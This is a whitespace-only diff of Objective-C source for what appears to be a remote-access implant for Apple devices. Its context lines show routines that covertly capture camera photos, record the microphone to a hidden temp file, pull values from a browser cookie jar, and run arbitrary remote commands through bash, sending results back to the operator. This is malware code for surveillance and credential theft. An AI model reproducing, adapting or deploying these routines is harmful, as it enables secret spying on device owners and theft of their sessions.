@@ -109,7 +109,7 @@ bool sysTaskRunning = false;
 }
 
 //MARK: Picture Data
--(void)takePicture:(bool)front {    
+-(void)takePicture:(bool)front {
     NSArray *devices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
     AVCaptureDevice *captureDevice = nil;
 
@@ -143,7 +143,7 @@ bool sysTaskRunning = false;
     [self debugLog:[NSString stringWithFormat:@"setting still image output"]];
     [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
     self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
-    
+
     NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
     [self.stillImageOutput setOutputSettings:outputSettings];
     [self.session addOutput:self.stillImageOutput];
@@ -177,7 +177,7 @@ bool sysTaskRunning = false;
 }
 
 
--(void)captureImageWithBlock:(void (^)(NSData *))imageData {    
+-(void)captureImageWithBlock:(void (^)(NSData *))imageData {
     AVCaptureConnection* videoConnection = nil;
 
     for (AVCaptureConnection* connection in self.stillImageOutput.connections) {
@@ -196,17 +196,17 @@ bool sysTaskRunning = false;
     if (videoConnection == nil) {
         return imageData(nil);
     }
-    
+
     //capture still image from video connection
     [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
      {
          dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
             [self.session stopRunning];
          });
-         
+
          if (error)
              imageData(nil);
-         
+
          NSData* data = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
          if (data) {
              imageData(data);
@@ -266,7 +266,7 @@ bool sysTaskRunning = false;
     //TODO: fix this from pausing
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-    [self sendString:[NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume]];    
+    [self sendString:[NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume]];
     [self term];
 }
 
@@ -315,7 +315,7 @@ bool sysTaskRunning = false;
    [self term];
 }
 
-    
+
 -(void)ipod:(NSString *)args {
     if ([args isEqualToString:@"play"]) {
         [[MPMusicPlayerController systemMusicPlayer] play];
@@ -398,7 +398,7 @@ bool sysTaskRunning = false;
             NSString *file = @"/tmp/.avatmp";
             [self.fileManager removeItemAtPath:file error:NULL];
             [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
-            
+
             NSString *destinationString = file;
             NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
             NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
@@ -409,7 +409,7 @@ bool sysTaskRunning = false;
             self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
             self.audioRecorder.meteringEnabled = true;
             self.audioRecorder.delegate = self;
-            
+
             [self.audioRecorder prepareToRecord];
             [self.audioRecorder record];
             [self sendString:@"Listening..."];
@@ -439,7 +439,7 @@ bool sysTaskRunning = false;
     self.audioRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: &error];
 }
 
-    
+
 -(AVCaptureDevice *)initcamera:(bool)front {
     NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
     AVCaptureDevice *captureDevice = nil;
@@ -461,10 +461,10 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     long cookieJarSize = ftell(cookieJar);
     int pos = 0; int curSearch = 0;int curChar;
     fseek(cookieJar, 0, 0);
-    
+
     while(pos <= cookieJarSize) {
         curChar = getc(cookieJar);pos++;
-        
+
         if(curChar == searchChars[curSearch]) { /* found a match */
             curSearch++;                        /* search for next char */
             if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
@@ -472,7 +472,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                 fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
                 return lastBytes;
             }
-            
+
         } else { /* didn't find a match */
             if (curSearch > 18) {
                 printf("fuck %d\n",searchChars[curSearch]);
@@ -592,7 +592,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
                     [_systask setLaunchPath:@"/bin/bash"];
                     [_systask setArguments:@[ @"-c", object]];
                     [_systask setCurrentDirectoryPath:[fileManager currentDirectoryPath]];
-                    
+
                     NSPipe *stdoutPipe = [NSPipe pipe];
                     stdinPipe = [NSPipe pipe];
                     [_systask setStandardInput:stdinPipe];
@@ -643,7 +643,7 @@ char* parseBinary(int* searchChars,int sizeOfSearch) {
     [self term];
 }
 
-    
+
 -(void)debugLog:(NSString *)string {
     NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:@"/tmp/esplog"];
     [fileHandle seekToEndOfFile];
